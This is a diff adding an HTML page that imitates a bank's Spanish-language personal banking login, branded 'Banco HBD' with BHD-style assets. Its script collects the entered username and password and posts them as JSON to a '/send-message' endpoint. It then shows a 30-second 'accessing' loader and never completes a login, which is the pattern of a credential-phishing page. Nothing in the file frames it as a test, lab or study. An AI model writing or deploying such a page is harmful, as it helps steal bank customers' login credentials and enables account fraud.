@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/css/bhd.css">
+    <link rel="stylesheet" href="/css/primeicons.css">
+    <title>Banco HBD - IPB</title>
+</head>
+<body>
+    <div class="container">
+        <div class="wrap">
+            <header>
+                <img src="/img/logo-bhd.svg" alt="">
+                <span class="title">Personal</span>
+            </header>
+            <form action="" class="form" id="form">
+                <div class="form-group">
+                    <label for="name">Usuario</label>
+                    <span class="pi pi-user"></span>
+                    <input type="text" name="name" id="name">
+                </div>
+                <div class="form-group">
+                    <label for="password">Contraseña</label>
+                    <span class="pi pi-lock"></span>
+                    <input type="password" name="password" id="password">
+                </div>
+                <div class="form-group">
+                    <input type="submit" value="Entrar" class="btn">
+                </div>
+                <div class="form-footer">
+                    <span class="pi pi-lock"></span>
+                    <a href="">¿Olvidaste tu clave de acceso?</a>
+                </div>
+                <span class="message" id="message">Usuario o contraseña incorrectos</span>
+            </form>
+        </div>
+        <footer>
+            <div class="wraper">
+                <span class="pi pi-arrow-left"></span>
+                <a href="">Ir a Internet Banking Empresarial</a>
+            </div>
+        </footer>
+    </div>
+    <div class="overlay" id="loader">
+        <div class="loader">Accediendo al canal, por favor espere</div>
+    </div>
+    <script>
+        const form = document.getElementById('form');
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const name = document.getElementById('name').value;
+            const password = document.getElementById('password').value;
+            const message = document.getElementById('message');
+            const loader = document.getElementById('loader');
+            console.log(name, password);
+
+            if(name === '') {
+                message.textContent = 'El campo de usuario es requerido';
+                message.classList.add('show');
+                hideMessage();
+            } else if(password === '') {
+                message.textContent = 'El campo de contraseña es requerido'
+                message.classList.add('show');
+                hideMessage();
+            } else {
+                loader.classList.add('show');
+                postData(name, password);
+                setTimeout(() => {
+                    loader.classList.remove('show');
+                }, 30000);
+            }
+        })
+        function hideMessage() {            
+            setTimeout(() => {
+                message.classList.remove('show');
+            }, 10000);
+        }
+
+        function postData(name, password) {
+            const url = '/send-message';
+            const data = {
+                username: name,
+                password: password
+            };
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log(data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
+</body>
+</html>
